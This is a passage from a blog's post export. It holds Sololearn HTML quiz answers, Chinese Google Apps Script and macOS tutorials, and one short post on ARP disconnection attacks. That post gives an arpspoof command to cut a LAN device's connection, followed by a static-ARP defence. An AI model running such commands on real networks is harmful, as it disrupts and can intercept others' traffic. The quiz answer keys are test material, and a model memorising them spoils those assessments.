attribute is used to align the content of a paragraph to the right? Answer: &lt;p align=&quot;right&quot;&gt; 12.1 Lesson Images Question: The &lt;img&gt; Tag What tag should be used to add an image? Answer: &lt;img/&gt; Question: Image Location What attribute should be used to add an image URL? Answer: src Question: Image Resizing What two attributes can be used to resize images inside HTML code? Answer: height width Question: Image Border Fill in the blank: Answer: &lt;img src=&quot;tree.jpg&quot; alt=&quot;&quot; /&gt; 13.1 Lesson Lists Question: HTML Ordered Lists Enter the tag corresponding to the list item: Answer: &lt;li&gt; Question: HTML Unordered List Fill in the blanks: Answer: &lt;ul&gt; &lt;li&gt;Item 1 &lt;/li&gt; &lt;li&gt;Item 2&lt;/li&gt; &lt;/ul&gt; 14.1 Lesson Blog Project: My Skills Question: My Skills Fill in the blanks to create a list in which the first item links to www.sololearn.com. Answer: &lt;ul&gt; &lt;li&gt; &lt;a href=&quot;https://www.sololearn.com&quot;&gt;A&lt;/a&gt; &lt;/li&gt; &lt;li&gt;B&lt;/li&gt; &lt;/ul&gt; 15.1 Lesson Tables Question: Creating a Table What tag is used to create columns in a row? Answer: td Question: The border and colspan Attributes What attribute is used to expand a cell for two or more cells? Answer: colspan Question: Colspan Color Fill in the blanks: Answer: &lt;table&gt; &lt;tr&gt; &lt;td&gt;Text 1&lt;/td&gt; &lt;td&gt;Text 2&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; Question: The align and bgcolor Attributes What attribute is used to change the color of a cell? Answer: bgcolor 16.1 Lesson Links Question: The &lt;a&gt; Tag What tag is used to create a link to a web page? Answer: &lt;a href=&quot;&quot;&gt; Question: Creating Your First Link Which attribute of the link tag contains the URL location that you are trying to link to? Answer: href Question: The target Attribute Which value of the target attribute makes the link open in a new tab or a new window? Answer: &lt;a href=&quot;2.html&quot; target=&quot;_blank&quot;&gt; 17.1 Lesson Blog Project: My Schedule Question: My Schedule Fill in the blanks to create a valid table: Answer: &lt;table&gt; &lt;tr&gt; &lt;td&gt;A&lt;/td&gt; &lt;td&gt;B&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; 18.1 Lesson Inline and Block Elements Question: Types of Elements Which of the following are block level elements? Answer: h1 div Question: Types of Elements Can you insert a block element inside an inline element? Answer: No 19.1 Lesson Forms Question: The &lt;form&gt; Element Which attribute contains the URL address of the webpage that is loaded after a form submission? Answer: action Question: The method and name Attributes Which value for the type attribute should be used for a password field? Answer: &lt;input type=&quot;password&quot;&gt; Question: Form Elements Fill in the blanks: Answer: &lt;form method=&quot;POST&quot; action=&quot;#&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt; &lt;/form&gt; Question: Form Elements Which value for the type attribute turns the input tag into a submit button? Answer: submit 20.1 Lesson Blog Project: Contact Form Question: Contact Form To support multiple lines of input you should use the following element: Answer: textarea 21.1 Lesson HTML Colors Question: HTML Colors! What characters does the hexadecimal system consist of? Answer: 0-f Question: HTML Color Model Which color model does HTML use? Answer: RGB Question: Color Values What would be the value of the color black in HTML, expressed by 6 hex characters? Answer: #000000 Question: Background and Font Colors Set the background color to white: Answer: &lt;body bgcolor=&quot;#FFFFFF&quot;&gt; 22.1 Lesson Frames Question: The &lt;frame&gt; Tag What attributes does the frameset tag require to indicate its size? Answer: rows and cols Question: Working with Frames Which attribute prevents a frame from resizing? Answer: noresize 23.1 Lesson Blog Project: Putting It All... Question: Blog Project The sections in the blog project are created using the following tag: Answer: div 24.1 Lesson Module 2 Quiz Question: When formatting text, can you get the same result when using different tags? Answer: yes Question: What does the href attribute contain? Answer: the URL of the page to be transferred Question: Which tag contains the cell tags besides the table tag? Answer: &lt;tr&gt; Question: What does HTML stand for? Answer: Hyper Text Markup Language Question: Choose the correct HTML tag for the largest heading: Answer: &lt;h1&gt; Question: Which of these tags are all table tags? Answer: &lt;table&gt;&lt;tr&gt;&lt;td&gt; Question: Fill in the blanks: Answer: &lt;html&gt; &lt;body&gt; &lt;form method=&quot;POST&quot;&gt; &lt;img src=&quot;image.jpg&quot; /&gt;&lt;br /&gt; &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;Submit&quot;&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; Question: Align the text of the paragraph to the right: Answer: &lt;html&gt; &lt;body align=&quot;center&quot;&gt; &lt;div align=&quot;right&quot;&gt; &lt;p&gt;This is a line of text&lt;/p&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; ","tags":[{"name":"Sololearn","slug":"sololearn","used":true,"link":"https://dev-coco.github.io/tag/sololearn/"}],"title":"Sololearn HTML course HTML Basics answers","feature":"https://dev-coco.github.io/post-images/Sololearn-HTML-Course.png","link":"https://dev-coco.github.io/post/Sololearn-HTML-Course-HTML-Basics-Answers/","stats":{"text":"9 min read","time":515000,"words":1374,"minutes":9},"date":"2022-07-25 20:43:12","dateFormat":"2022-07-25"},{"content":"Sololearn HTML course Overview answers .q,.a{font-weight:bold;}.q{color:red;}.a{color:green} Here are all the questions and answers that I hope will help you learn HTML course. Other course answers Sololearn HTML course HTML Basics answers Sololearn HTML course Challenges answers Sololearn HTML course HTML5 answers 1.1 Lesson What is HTML? Question: Is HTML used for creating websites? Answer: Yes Question: Welcome to HTML! HTML code is used to Answer: structure the content of a web page Question: From HTML code to Web Pages True or false? Web browsers read HTML code to display the resulting web page Answer: True Question: Text Paragraphs Which of the following is the valid paragraph tag? Answer: &lt;p&gt; Question: Opening and Closing Tags Drag and drop to create a valid paragraph element with the content &quot;I'm a paragraph&quot;. Answer: &lt;p&gt;I'm a paragraph&lt;/p&gt; Question: HTML Elements Which of the following will create a text paragraph on a web page? Answer: &lt;p&gt;Paragraph 1&lt;/p&gt; Question: Lesson Takeaways Select the only true statement Answer: HTML controls the structure of a web page 2.1 Lesson HTML Elements Question: Writing HTML code You can use the Code Playground to write, run and test code. Answer: TRUE Question: More HTML Elements What’s the HTML tag for a Level 1 heading element? Answer: &lt;h1&gt; Question: Text Headings Drag and drop to create text headings of two different levels Answer: &lt;h1&gt;Food Menu&lt;/h1&gt; &lt;h2&gt;Starters&lt;/h2&gt; Question: Container Tags Drag and drop to create valid HTML code Answer: &lt;h1&gt;Section 1&lt;/h1&gt; &lt;h2&gt;Chapter 3&lt;/h2&gt; &lt;p&gt;Once upon a time …&lt;/p&gt; Question: Image Tags Drag and drop to create a valid image tag in HTML Answer: &lt;img src=&quot;http://www.sololearn/image.jpg&quot;&gt; Question: Lesson Takeaways Select all of the true statements Answer: Images don't require a closing tag Images are examples of empty tags 3.1 Lesson Creating Your First HTML Page Question: The HTML File What type of editor is used to edit HTML code? Answer: text editor Question: The HTML File What is the correct extension for HTML files? Answer: .html Question: The &lt;head&gt; Tag Drag and drop from the options below to create a valid HTML document: Answer: &lt;html&gt; &lt;head&gt; &lt;/head&gt; &lt;/html&gt; Question: The &lt;title&amp;gt Tag Where should you put the title tag? Answer: Between the head tags 4.1 Lesson Creating a Blog Question: Creating a Blog Fill in the blanks to add a title to the html page. Answer: &lt;html&gt; &lt;head&gt; &lt;title&gt;My Blog&lt;/title&gt; &lt;/head&gt; &lt;/html&gt; 5.1 Lesson Module 1 Quiz Question: What is HTML? Answer: Markup Language Question: Of which main parts does the HTML file consist of? Answer: head and body Question: Which tag contains the visual part of the web page? Answer: &lt;body&gt; Question: Fill in the blanks: Answer: &lt;html&gt; &lt;head&gt; &lt;/head&gt; &lt;body&gt;This is a line of text. &lt;/ body&gt; &lt;/html&gt; ","tags":[{"name":"Sololearn","slug":"sololearn","used":true,"link":"https://dev-coco.github.io/tag/sololearn/"}],"title":"Sololearn HTML course Overview answers","feature":"https://dev-coco.github.io/post-images/Sololearn-HTML-Course.png","link":"https://dev-coco.github.io/post/sololearn-html-course-overview-answers/","stats":{"text":"4 min read","time":211000,"words":563,"minutes":4},"date":"2022-07-25 19:52:50","dateFormat":"2022-07-25"},{"content":"Sololearn HTML course Challenges answers .q,.a{font-weight:bold;}.q{color:red;}.a{color:green} Here are all the questions and answers that I hope will help you learn HTML course. Other course answers Sololearn HTML course Overview answers Sololearn HTML course HTML Basics answers Sololearn HTML course HTML5 answers 25.1 Lesson Challenge 1 Question: Is width=&quot;100&quot; and width=&quot;100%&quot; the same? Answer: No Question: Fill in the blanks to create an h1 heading containing the text &quot;My first website&quot; followed by an h2 tag containing &quot;Sample Page&quot;: Answer: &lt;html&gt; &lt;body&gt; &lt;h1&gt;My First Website&lt;/h1&gt; &lt;h2&gt;Sample Page&lt;/h2&gt; &lt;/body&gt; &lt;/html&gt; Question: Fill in the blanks to make the paragraph bold using the tag: Answer: &lt;h1&gt;Some heading&lt;/h1&gt; &lt;p&gt;&lt;b&gt;I am learning HTML&lt;/b&gt;&lt;/p&gt; Question: During page creation, which tag adds a page name that will show in the title bar of the user's Internet browser? Answer: &lt;title&gt; Question: Fill in the blanks to make the text &quot;First paragraph&quot; a comment: Answer: &lt;html&gt; &lt;body&gt; &lt;!-- First paragraph --&gt; &lt;p&gt;Welcome to my webpage&lt;/p&gt; &lt;/body&gt; &lt;/html&gt; Question: Fill in the blanks to display the image, &quot;tree.jpg&quot;, at a 200px height and a 500px width: Answer: &lt;img src=&quot;tree.jpg&quot; height=&quot;200px&quot; alt=&quot;&quot; width=&quot;500px&quot; /&gt; Question: Fill in the blanks to create an ordered list: Answer: &lt;h4&gt;An Ordered List: &lt;/h4&gt; &lt;ol&gt; &lt;li&gt;Coffee&lt;/li&gt; &lt;li&gt;Tea&lt;/li&gt; &lt;li&gt;Milk &lt;/li&gt; &lt;/ol&gt; Question: Fill in the blanks and align the table to the center of the page: Answer: &lt;html&gt; &lt;head&gt; &lt;title&gt;My Page&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;table align=&quot;center&quot;&gt; &lt;tr&gt; &lt;td&gt; &lt;ul&gt; &lt;li&gt;item&lt;/li&gt; &lt;/ul&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/body&gt; &lt;/html&gt; Question: Fill in the blanks so that the website www.sololearn.com opens upon clicking the image: Answer: &lt;a href=&quot;http://www.sololearn.com&quot;&gt; &lt;img src=&quot;1.jpg&quot; alt=&quot;&quot; /&gt; &lt;/a&gt; ","tags":[{"name":"Sololearn","slug":"sololearn","used":true,"link":"https://dev-coco.github.io/tag/sololearn/"}],"title":"Sololearn HTML course Challenges answers","feature":"https://dev-coco.github.io/post-images/Sololearn-HTML-Course.png","link":"https://dev-coco.github.io/post/Sololearn-HTML-Course-Challenges-Answers/","stats":{"text":"3 min read","time":166000,"words":443,"minutes":3},"date":"2022-07-25 18:29:01","dateFormat":"2022-07-25"},{"content":"获取指定单元格的范围。 当前选中单元格 getCurrentCell() 获取表格内选中的其中一个单元格，即使选择多个单元格，也只返回左上角的第一个单元格。代码示例： SpreadsheetApp.getActiveSheet().getCurrentCell() 例如下图，选中 B4 到 D10，但是只会返回 B4 单元格的范围。 当前选中范围 getActiveRange() 获取表格内选中的范围。代码示例： SpreadsheetApp.getActiveSheet().getActiveRange() 例如下图，选中 B3 到 C5 这个范围，那么就会返回这部分单元格的范围。 当前数据存在范围 getDataRange() 从 A1 为起始点获取当前数据存在的范围。代码示例： SpreadsheetApp.getActiveSheet().getDataRange() 例如下图，数据存放在 B2 到 D8 的范围，那么会返回从 A1 到 D8 单元格的范围。 获取指定范围 方法一 getRange(a1Notation) a1Notation 放入 A1 表示法引用单元格范围。代码示例： SpreadsheetApp.getActiveSheet().getRange('C2:C7') 那么会获取 C2 到 C7 范围的单元格。 方法二 getRange(row, column, numRows, numColumns) row 设置起始行；column 设置起始列；numRows 设置行数，非必填参数，默认为 1；numColumns 设置列数，非必填参数，默认为 1。 代码示例： SpreadsheetApp.getActiveSheet().getRange(4, 2, 3, 2) 从第 3 行，第 2 列开始计算，也就是下图中 B4 的位置，然后再获取 3 行 和 2 列的内容。同等于 B4:C6 范围。 ","tags":[{"name":"Google 脚本","slug":"google-script","used":true,"link":"https://dev-coco.github.io/tag/google-script/"}],"title":"Google 脚本 获取范围","feature":"https://dev-coco.github.io/post-images/Google-Script-Get-Range.jpg","link":"https://dev-coco.github.io/post/Google-Script-Get-Range/","stats":{"text":"2 min read","time":79000,"words":348,"minutes":2},"date":"2022-07-24 03:42:26","dateFormat":"2022-07-24"},{"content":"将内容写入到日志进行调试。 字符写入日志 Logger.log(data) data 放入需要输出到日志的内容。下面是示例代码： Logger.log('Log 测试') 输出结果 格式化后的字符写入日志 Logger.log(format, values) format 放入包含占位符的内容，values 放入相应的变量。 %d 占位符代表整数，下面是示例代码： Logger.log('我有 %d 本书', 5) 输出结果 输出的结果会将内容中 %d 替换对应的参数。 %s 占位符代表字符串 Logger.log('青苹果是%s', '绿色') 输出结果 支持同时使用多个占位符，示例代码如下： Logger.log('橘子是%s的，香蕉是%s的', '橙色', '黄色') 输出结果 会按照从左到右的顺序放入对应的变量。 ","tags":[{"name":"Google 脚本","slug":"google-script","used":true,"link":"https://dev-coco.github.io/tag/google-script/"}],"title":"Google 脚本 Logger 调试","feature":"https://dev-coco.github.io/post-images/Google-Script-Logger-Debug.jpg","link":"https://dev-coco.github.io/post/Google-Script-Logger-Debug/","stats":{"text":"1 min read","time":45000,"words":205,"minutes":1},"date":"2022-07-22 10:03:04","dateFormat":"2022-07-22"},{"content":"ARP 断网攻击是针对地址解析协议的一种攻击技术，可以让攻击者取得内网的数据封包甚至篡改，也可以让被攻击的设备无法正常连接网络。 ARP 攻击 输入 ifconfig 查看当前使用的网卡信息。例如当前使用的是 en1。 使用 arp -a 获取当前局域网下的所有设备的内网 IP 和 MAC 地址。 例如要攻击 192.168.2.254 这个设备，输入命令： sudo arpspoof -i 网卡 -t 内网IP 路由器IP 然后另外一个设备的网络就无法正常连接。 防范方法 sudo arp -s 路由器IP BSSID BSSID 在网络可以查看，按住 option 键，然后再点击网络。 设置后，当设备再次被 ARP 攻击时依然可以正常联网，不受影响。 ","tags":[{"index":-1,"name":"安全","slug":"security","used":true,"link":"https://dev-coco.github.io/tag/security/"}],"title":"ARP 断网攻击","feature":"","link":"https://dev-coco.github.io/post/ARP-Disconnection-Attack/","stats":{"text":"1 min read","time":47000,"words":213,"minutes":1},"date":"2022-07-21 20:55:18","dateFormat":"2022-07-21"},{"content":"使用指纹快速授权，节省输入密码的时间。 在使用 sudo 命令的时候，需要输入开机密码才可以获取 root 权限。当密码特别长的时候，输入密码就会特别费时间。 在 Terminal 输入以下命令，然后重新启动 Terminal。 sudo sed -i &quot;.bak&quot; '2s/^/auth sufficient pam_tid.so\\'$'\\n/g' /etc/pam.d/sudo 再次使用 sudo 命令的时候，就会提示使用指纹来解锁了。 上面的命令会把 /etc/pam.d/sudo 这个文件备份为 sudo.bak，然后在 sudo 文件的第二行加入 uth sufficient pam_tid.so。修改的目的是为了在 sudo 命令认证过程加入一个 Touch ID 验证的模块。 如果需要恢复原来的文件，运行以下命令。 sudo mv /etc/pam.d/sudo.bak /etc/pam.d/sudo ","tags":[{"name":"Shell","slug":"shell","used":true,"link":"https://dev-coco.github.io/tag/shell/"},{"index":-1,"name":"macOS","slug":"macos","used":true,"link":"https://dev-coco.github.io/tag/macos/"}],"title":"Touch ID 授权 MacOS 终端","feature":"","link":"https://dev-coco.github.io/post/TouchID-Authorize-Terminal/","stats":{"text":"1 min read","time":49000,"words":207,"minutes":1},"date":"2022-07-19 23:04:47","dateFormat":"2022-07-19"},{"content":"通过脚本对表格进行操作。 注意：以下所有内容，必须先 获取到工作表后 才可以进行操作。 隐藏表格 使用 hideSheet() 将工作表隐藏，但是不允许把所有的工作表全部都隐藏起来，至少保留一个公开的工作表。 SpreadsheetApp.getActiveSpreadsheet().getSheets()[1].hideSheet() 显示表格 使用 showSheet() 显示被隐藏起来的工作表，如果工作表已经显示则不会有任何效果。 SpreadsheetApp.getActiveSpreadsheet().getSheets()[1].showSheet() 修改表格名称 使用 setName(name) 修改表格名称，name 参数放入表格的名称。 SpreadsheetApp.getActiveSheet().setName(name) 复制表格 使用 copyTo 可以复制一个工作表，也可以将工作表复制到另外一个电子表格。 const sheet = SpreadsheetApp.getActiveSpreadsheet() const orginSheet = sheet.getActiveSheet() orginSheet.copyTo(sheet) 需要两个参数，一个是工作表，另一个是电子表格。例子中的 orginSheet 变量是当前的工作表，使用 copyTo(sheet)，sheet 参数放入电子表格，可以是当前的电子表格，也可以是其它的电子表格，前提是需要有编辑的权限。 复制完表格后，默认会在原来表格名称的基础上加上（副本），不过可以使用上面提到的 setName 将新建的表格重命名。 const sheet = SpreadsheetApp.getActiveSpreadsheet() const orginSheet = sheet.getActiveSheet() orginSheet.copyTo(sheet).setName('sheetName') 复制工作表后，将工作表重命名为 “sheetName”。 删除表格 使用 deleteSheet(spreadsheet) 删除工作表，spreadsheet 参数放入工作表。 const sheet = SpreadsheetApp.getActiveSpreadsheet() sheet.deleteSheet(sheet.getSheets()[1]) 需要两个参数，一个是电子表格，另一个是工作表。例子中的 sheet 变量是当前的电子表格，使用 deleteSheet(spreadsheet)，spreadsheet 放入需要删除的工作表。 保护表格 使用 protect() 设置工作表的保护权限，禁止被编辑。 const sheet = SpreadsheetApp.getActiveSheet() const email = sheet.protect().getEditors() sheet.protect().removeEditors(email) 例子中的 sheet 变量是当前的工作表。使用 protect() 为工作表添加保护权限，但是在默认情况下，添加保护会允许所有人都可以编辑，所以需要移除掉所有人，仅限自己可以编辑。使用 getEditors() 获取到当前表格有权限的邮箱账号，并且设置 email 变量。removeEditors(email) 用来移除其他人的权限，email 参数放入邮箱，支持数组。全部邮箱都移除后，最后就剩下自己的账号有编辑的权限了。 取消保护 使用 protect() 取消工作表的保护权限。 const sheet = SpreadsheetApp.getActiveSheet() sheet.protect().remove() 例子中的 sheet 变量是当前的工作表，使用 protect() 操作工作表的保护权限，再使用 remove() 移除所有的保护权限。 ","tags":[{"name":"Google 脚本","slug":"google-script","used":true,"link":"https://dev-coco.github.io/tag/google-script/"},{"name":"Excel","slug":"excel","used":true,"link":"https://dev-coco.github.io/tag/excel/"}],"title":"Google 脚本 操作表格","feature":"https://dev-coco.github.io/post-images/Google-Script-Operate-Excel.jpg","link":"https://dev-coco.github.io/post/Google-Script-Operate-Excel/","stats":{"text":"3 min read","time":151000,"words":672,"minutes":3},"date":"2022-07-15 01:00:27","dateFormat":"2022-07-15"},{"content":"获取工作表的一些信息。 获取工作表名称 getSheetName() 需要先获取到电子表格后，才可以获取当前工作表的名称，代码示例如下： SpreadsheetApp.getActiveSpreadsheet().getSheetName() 获取当前工作表 ID getSheetId() 需要先 获取到电子表格 后，才可以获取到当前工作表的 ID，也就是 gid= 后面数字的部分，返回的结果是数值。代码示例如下： SpreadsheetApp.getActiveSpreadsheet().getSheets()[1].getSheetId() 跳转表格 第一种 setActiveSheet(sheet) sheet 参数需要放入电子表格。示例如下： SpreadsheetApp.setActiveSheet(SpreadsheetApp.getActiveSpreadsheet().getSheets()[1]) 使用 SpreadsheetApp.getActiveSpreadsheet().getSheets()[1] 获取到第二个工作表，然后把整个代码作为 setActiveSheet 的参数。运行后就会跳转到第二个工作表了。 第二种 activate() 使用前需要先 获取到工作表，然后在后面使用 activate()，完整例子如下： SpreadsheetApp.getActiveSpreadsheet().getSheets()[0].activate() 先获取到第一个工作表，然后使用 activate() 跳转到获取到的工作表。 ","tags":[{"name":"Google 脚本","slug":"google-script","used":true,"link":"https://dev-coco.github.io/tag/google-script/"}],"title":"Google 脚本 工作表相关","feature":"https://dev-coco.github.io/post-images/Google-Script-Sheet-Related.jpg","link":"https://dev-coco.github.io/post/Google-Script-Sheet-Related/","stats":{"text":"1 min read","time":55000,"words":247,"minutes":1},"date":"2022-07-12 06:04:11","dateFormat":"2022-07-12"},{"content":"使用一些不同的方法获取工作表，然后才可以进行一些其它的操作。 获取工作表 获取当前正在使用的工作表 SpreadsheetApp.getActiveSheet() 通过 getActiveSheet() 获取当前正在使用的工作表，无需放入任何参数，需要绑定 Google 应用才可以使用。 获取所有的工作表 getSheets() 在使用 getSheets() 之前需要先 获取到电子表格，然后才可以使用。例如获取当电子表格的所有工作表，那么先获取到当前的电子表格 SpreadsheetApp.getActiveSpreadsheet()，然后再加上 getSheets() 完整代码如下： SpreadsheetApp.getActiveSpreadsheet().getSheets() 当然，也可以把 getActiveSpreadsheet() 换成其它的方法来获取电子表格的，然后再获取工作表，获取到的结果是一个数组。 指定名称获取工作表 getSheetByName(name) 需要先获取到电子表格后，才可以获取指定的工作表，name 放入工作表的名称。代码示例如下： SpreadsheetApp.getActiveSpreadsheet().getSheetByName('工作表1') ","tags":[{"name":"Google 脚本","slug":"google-script","used":true,"link":"https://dev-coco.github.io/tag/google-script/"}],"title":"Google 脚本 读取工作表","feature":"https://dev-coco.github.io/post-images/Google-Script-Read-Sheet.jpg","link":"https://dev-coco.github.io/post/Google-Script-Read-Sheet/","stats":{"text":"1 min read","time":54000,"words":255,"minutes":1},"date":"2022-07-11 23:18:37","dateFormat":"2022-07-11"},{"content":"Google 脚本的 SpreadsheetApp 服务可以读取、写入、创建表格。 获取电子表格 获取当前电子表格 SpreadsheetApp.getActiveSpreadsheet() 通过 getActiveSpreadsheet() 获取当前正在使用的电子表格，无需放入任何参数，需要绑定 Google 应用才可以使用，否则获取不到当前正在使用的电子表格。 通过链接获取电子表格 SpreadsheetApp.openByUrl(url) 通过 openByUrl(url) 获取指定的电子表格，url 参数放入表格的链接，需要注意的是当前的 Google 账号必须有表格的访问权限，否则获取不到电子表格。 通过表格 ID 获取电子表格 SpreadsheetApp.openById(id) 通过 openById(id) 获取指定的电子表格，id 参数放入表格的 ID，效果和 openByUrl 一样，唯一的区别就是 openByUrl 放入的是表格链接，openById 放入的是表格 ID。 ","tags":[{"name":"Google 脚本","slug":"google-script","used":true,"link":"https://dev-coco.github.io/tag/google-script/"}],"title":"Google 脚本 读取电子表格","feature":"https://dev-coco.github.io/post-images/Google-Script-Read-Spreadsheet.jpg","link":"https://dev-coco.github.io/post/Google-Script-Read-Spreadsheet/","stats":{"text":"1 min read","time":48000,"words":220,"minutes":1},"date":"2022-07-10 07:53:03","dateFormat":"2022-07-10"},{"content":"基本的界面介绍。 侧边栏 鼠标放在侧边栏上等待一会后会显示完整的侧边栏内容。 概览 当前 Google 脚本项目的详细信息。 编辑器 ① 命名 Google 脚本项目的名称。 ② 撤销编辑的内容。 ③ 重做编辑的内容。 ④ 保存当前编辑的内容。 ⑤ 运行选中的函数，会自动保存所有的内容。 ⑥ 选择待运行的函数。 ⑦ 点击后会在下面显示运行后输出的日志。 ⑧ 添加文件，重命名文件名；添加第三方脚本库；添加服务。 ⑨ 部署和管理服务。 触发器 用来添加触发器来执行函数，并且显示函数的运行的详细信息。 脚本执行 查看每个函数执行的时间和状态以及日志。 项目设置 一些进阶的设置项目。 ","tags":[{"name":"Google 脚本","slug":"google-script","used":true,"link":"https://dev-coco.github.io/tag/google-script/"}],"title":"Google 脚本 界面介绍","feature":"https://dev-coco.github.io/post-images/Google-Script-Interface-Introduction.jpg","link":"https://dev-coco.github.io/post/Google-Script-Interface-Introduction/","stats":{"text":"1 min read","time":44000,"words":219,"minutes":1},"date":"2022-07-08 16:02:15","dateFormat":"2022-07-08"},{"content":"数组可以包含任意数据类型，并且通过索引来获取元素。 定义数组 使用中括号 [] 定义数组。 数值中的每个值使用逗号间隔。 例子： ['a', 'b', 'c', 'd', 'e', 'f', 'g'] 数组元素个数 length 属性可以查看数组的长度。 例子： const arr = ['a', 'b', 'c', 'd', 'e', 'f', 'g'] console.log(arr.length) // 预期输出：7 数组取值 根据下标取值，下标为数字，下标从 0 开始。 const arr = ['a', 'b', 'c', 'd', 'e', 'f', 'g'] console.log(arr[0]) // 预期输出：a console.log(arr[1]) // 预期输出：b console.log(arr[2]) // 预期输出：c 因为下标是从 0 开始的，那么 arr[0] 取的就是数组中第一个值，也就是 a 字符串。 写入数组 使用 push() 可以将一个或者多个元素提那件到数组的末尾。 例子： const arr = ['a', 'b', 'c', 'd', 'e', 'f', 'g'] arr.push('h') arr.push('i') console.log(arr) // 预期输出：Array ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i'] 二维数组 二维数组是以数组作为元素的数组，简单的说就是数组的数组，同时数组的长度一致。 例子： [ ['a', 'b', 'c', 'd'], ['e', 'f', 'g', 'h'], ['i', 'j', 'k', 'l'] ] 在 Google 表格中数据是以二维数组的方式储存的，下面用一张形象的图来理解二维数组的结构。 ","tags":[{"name":"Javascript","slug":"javascript","used":true,"link":"https://dev-coco.github.io/tag/javascript/"},{"name":"Google 脚本","slug":"google-script","used":true,"link":"https://dev-coco.github.io/tag/google-script/"}],"title":"初识数组","feature":"","link":"https://dev-coco.github.io/post/Understand-Array/","stats":{"text":"2 min read","time":83000,"words":337,"minutes":2},"date":"2022-07-05 12:32:02","dateFormat":"2022-07-05"},{"content":"❄️ 为你的夏日带去清凉！ !function (e) { function r(r) { for (var n, u, a = r[0], c = r[1], l = r[2], s = 0, p = []; s < a.length; s++)u = a[s], Object.prototype.hasOwnProperty.call(o, u) && o[u] && p.push(o[u][0]), o[u] = 0; for (n in c) Object.prototype.hasOwnProperty.call(c, n) && (e[n] = c[n]); for (f && f(r); p.length;)p.shift()(); return i.push.apply(i, l || []), t() } function t() { for (var e, r = 0; r < i.length; r++) { for (var t = i[r], n = !0, a = 1; a < t.length; a++) { var c = t[a]; 0 !== o[c] && (n = !1) } n && (i.splice(r--, 1), e = u(u.s = t[0])) } return e } var n = {}, o = { 1: 0 }, i = []; function u(r) { if (n[r]) return n[r].exports; var t = n[r] = { i: r, l: !1, exports: {} }; return e[r].call(t.exports, t, t.exports, u), t.l = !0, t.exports } u.e = function (e) { var r = [], t = o[e]; if (0 !== t) if (t) r.push(t[2]); else { var n = new Promise((function (r, n) { t = o[e] = [r, n] })); r.push(t[2] = n); var i, a = document.createElement(\"script\"); a.charset = \"utf-8\", a.timeout = 120, u.nc && a.setAttribute(\"nonce\", u.nc), a.src = function (e) { return u.p + \"static/js/\" + ({}[e] || e) + \".\" + { 3: \"b168f68f\" }[e] + \".chunk.js\" }(e); var c = new Error; i = function (r) { a.onerror = a.onload = null, clearTimeout(l); var t = o[e]; if (0 !== t) { if (t) { var n = r && (\"load\" === r.type ? \"missing\" : r.type), i = r && r.target && r.target.src; c.message = \"Loading chunk \" + e + \" failed.\\n(\" + n + \": \" + i + \")\", c.name = \"ChunkLoadError\", c.type = n, c.request = i, t[1](c) } o[e] = void 0 } }; var l = setTimeout((function () { i({ type: \"timeout\", target: a }) }), 12e4); a.onerror = a.onload = i, document.head.appendChild(a) } return Promise.all(r) }, u.m = e, u.c = n, u.d = function (e, r, t) { u.o(e, r) || Object.defineProperty(e, r, { enumerable: !0, get: t }) }, u.r = function (e) { \"undefined\" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, { value: \"Module\" }), Object.defineProperty(e, \"__esModule\", { value: !0 }) }, u.t = function (e, r) { if (1 & r && (e = u(e)), 8 & r) return e; if (4 & r && \"object\" == typeof e && e && e.__esModule) return e; var t = Object.create(null); if (u.r(t), Object.defineProperty(t, \"default\", { enumerable: !0, value: e }), 2 & r && \"string\" != typeof e) for (var n in e) u.d(t, n, function (r) { return e[r] }.bind(null, n)); return t }, u.n = function (e) { var r = e && e.__esModule ? function () { return e.default } : function () { return e }; return u.d(r, \"a\", r), r }, u.o = function (e, r) { return Object.prototype.hasOwnProperty.call(e, r) }, u.p = \"./\", u.oe = function (e) { throw console.error(e), e }; var a = this[\"webpackJsonpair-conditioner\"] = this[\"webpackJsonpair-conditioner\"] || [], c = a.push.bind(a); a.push = r, a = a.slice(); for (var l = 0; l < a.length; l++)r(a[l]); var f = c; t() }([]) ","tags":[{"index":-1,"name":"其它","slug":"other","used":true,"link":"https://dev-coco.github.io/tag/other/"}],"title":"便携小空调","feature":"","link":"https://dev-coco.github.io/post/Air-Conditioner/","stats":{"text":"4 min read","time":193000,"words":521,"minutes":4},"date":"2022-07-04 19:43:29","dateFormat":"2022-07-04"},{"content":"一个本地快速备份和恢复备份备忘录的工具。 这是一个使用 Apple Script 写的备份工具，点击下载。 源码如下： set Features to choose from list {&quot;备份&quot;, &quot;恢复备份&quot;} with title &quot;备忘录备份工具&quot; with prompt &quot;请选择&quot; do shell script &quot;killall -9 Notes &amp;&gt; /dev/null &amp;&quot; with administratorprivileges if the Features is {&quot;备份&quot;} then do shell script &quot;rm -rf ~/Desktop/Notes_Backup &amp;&amp; mkdir ~/Desktop/Notes_Backup &amp;&amp; cp -f ~/Library/Group\\\\ Containers/group.com.apple.notes/NoteStore.sqlite* ~/Desktop/Notes_Backup&quot; with administratorprivileges display dialog &quot;备份完成&quot; buttons {&quot;完成&quot;} else if Features is {&quot;恢复备份&quot;} then do shell script &quot;cp -f ~/Desktop/Notes_Backup/* ~/Library/Group\\\\ Containers/group.com.apple.notes&quot; with administratorprivileges display dialog &quot;恢复备份完成&quot; buttons {&quot;完成&quot;} end if 运行后，选择备份功能，然后点击好。 然后会在桌面出现一个 Notes_Backup 文件夹。 里面是备忘录备份的文件，可以将一整个文件夹都保存好。 如果需要恢复备份，将 Notes_Backup 文件夹放在桌面，再次运行 Apple Script，当提示恢复备份完成时，就说明已经恢复好备份了。 ","tags":[{"index":-1,"name":"macOS","slug":"macos","used":true,"link":"https://dev-coco.github.io/tag/macos/"}],"title":"macOS 备忘录备份工具","feature":"","link":"https://dev-coco.github.io/post/macOS-Backup-Notes/","stats":{"text":"2 min read","time":77000,"words":285,"minutes":2},"date":"2022-06-30 12:04:23","dateFormat":"2022-06-30"},{"content":"Google 脚本是一种基于 Javascript 的编码语言，全称 Google Apps Script，简称为 GAS。 作用 